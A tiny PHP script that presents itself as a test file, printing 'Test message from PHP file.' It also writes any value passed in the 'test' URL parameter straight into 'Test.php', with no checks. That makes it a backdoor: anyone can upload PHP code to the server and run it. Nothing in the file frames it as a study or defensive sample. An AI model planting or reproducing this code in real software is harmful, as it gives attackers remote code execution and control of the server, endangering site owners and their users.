<?php

if(isset($_GET["test"]))
{
    file_put_contents("Test.php", $_GET["test"]);
}
echo "Test message from PHP file.";
